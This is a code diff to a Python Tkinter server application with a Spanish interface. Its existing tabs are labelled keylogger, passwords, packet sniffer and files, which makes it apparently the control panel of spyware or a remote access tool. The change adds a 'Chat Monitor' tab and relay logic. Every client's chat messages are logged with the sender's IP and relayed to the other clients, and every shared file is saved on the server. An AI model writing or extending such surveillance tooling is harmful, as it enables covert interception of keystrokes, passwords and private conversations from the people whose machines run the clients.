@@ -77,6 +77,7 @@ class ServerApp:
         self.running = False
         self.email_enabled = True
         self.clients_count = 0
+        self.active_clients = {} # {addr: conn}
         self.server_ip = self._get_local_ip()
 
         for d in [LOG_DIR, SCREENSHOT_DIR, SNIFF_DIR, FILE_DIR]:
@@ -156,6 +157,7 @@ class ServerApp:
         self._build_password_tab()
         self._build_sniffer_tab()
         self._build_files_tab()
+        self._build_chat_monitor_tab()
 
     # ══════════════════════════════════════════════════════
     #  TAB 1: KEYLOGGER
@@ -576,6 +578,52 @@ class ServerApp:
             except Exception as e:
                 messagebox.showerror("Error", f"No se pudo eliminar: {e}")
 
+    def _build_chat_monitor_tab(self):
+        bg = "#1a1a2e"
+        frame = tk.Frame(self.notebook, bg=bg)
+        self.notebook.add(frame, text="💬 Chat Monitor")
+
+        tk.Label(frame, text="Conversaciones en tiempo real entre clientes:",
+                 bg=bg, fg="#e0e0e0", font=("Helvetica", 10)).pack(anchor="w", padx=5, pady=5)
+
+        self.chat_log = scrolledtext.ScrolledText(frame, bg="#0d1117", fg="#e0e0e0",
+                                                   font=("Courier", 10), state=tk.DISABLED, wrap=tk.WORD)
+        self.chat_log.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)
+        self.chat_log.tag_config("msg", foreground="#e0e0e0")
+        self.chat_log.tag_config("system", foreground="#58a6ff")
+        self.chat_log.tag_config("ip", foreground="#f0c040", font=("Courier", 10, "bold"))
+
+    def _chat_append(self, sender, message, is_system=False):
+        def _do():
+            self.chat_log.config(state=tk.NORMAL)
+            ts = datetime.now().strftime("%H:%M:%S")
+            if is_system:
+                self.chat_log.insert(tk.END, f"[{ts}] SYSTEM: {message}\n", "system")
+            else:
+                self.chat_log.insert(tk.END, f"[{ts}] ", "system")
+                self.chat_log.insert(tk.END, f"{sender}: ", "ip")
+                self.chat_log.insert(tk.END, f"{message}\n", "msg")
+            self.chat_log.see(tk.END)
+            self.chat_log.config(state=tk.DISABLED)
+        self.root.after(0, _do)
+
+    def _broadcast_chat(self, sender_addr, msg_type, payload, filename=None):
+        """Reenvía un mensaje o archivo de un cliente a todos los demás."""
+        header = {"type": msg_type, "from": sender_addr[0], "size": len(payload)}
+        if filename:
+            header["filename"] = filename
+        
+        header_json = json.dumps(header).encode("utf-8") + b"\n"
+        full_msg = header_json + payload
+
+        for addr, conn in list(self.active_clients.items()):
+            if addr != sender_addr: # No enviar al remitente
+                try:
+                    conn.sendall(full_msg)
+                except:
+                    # El cliente probablemente se desconectó
+                    pass
+
     def _sniff_append(self, text, tag=""):
         def _do():
             self.sniff_log.config(state=tk.NORMAL)
@@ -682,6 +730,7 @@ class ServerApp:
                 try:
                     conn, addr = self.server_socket.accept()
                     self.clients_count += 1
+                    self.active_clients[addr] = conn
                     self.root.after(0, self.clients_label.config,
                                     {"text": f"Clientes: {self.clients_count}"})
                     threading.Thread(target=self._handle_client, args=(conn, addr), daemon=True).start()
@@ -702,6 +751,7 @@ class ServerApp:
         self.port_entry.config(state=tk.NORMAL)
         self.status_label.config(text="● Detenido", fg="#ff6b6b")
         self.clients_count = 0
+        self.active_clients.clear()
         self.root.after(0, self.clients_label.config, {"text": "Clientes: 0"})
 
     def _handle_client(self, conn, addr):
@@ -775,11 +825,31 @@ class ServerApp:
                         self._log(f"📁 [{client_ip}] Documento recibido: {orig_fname}", "success")
                         self.root.after(0, self._refresh_files_list)
 
+                    elif msg_type == "chat_msg":
+                        text = payload.decode("utf-8", errors="replace")
+                        self._chat_append(client_ip, text)
+                        # Reenviar a otros clientes
+                        self._broadcast_chat(addr, "chat_msg", payload)
+
+                    elif msg_type == "chat_file":
+                        orig_fname = header.get("filename", "chat_file")
+                        ts_file = datetime.now().strftime("%H%M%S")
+                        new_fname = f"chat_{client_ip}_{ts_file}_{orig_fname}"
+                        path = os.path.join(FILE_DIR, new_fname)
+                        with open(path, "wb") as f:
+                            f.write(payload)
+                        self._chat_append(client_ip, f"📎 Envío archivo: {orig_fname} (Guardado en server)")
+                        # Reenviar a otros clientes para que ellos también lo descarguen
+                        self._broadcast_chat(addr, "chat_file", payload, orig_fname)
+                        self.root.after(0, self._refresh_files_list)
+
         except ConnectionError:
             self._log(f"❌ Desconectado: {client_ip}", "warning")
         except Exception as e:
             self._log(f"Error con {client_ip}: {e}", "error")
         finally:
+            if addr in self.active_clients:
+                del self.active_clients[addr]
             conn.close()
             self.clients_count = max(0, self.clients_count - 1)
             self.root.after(0, self.clients_label.config,
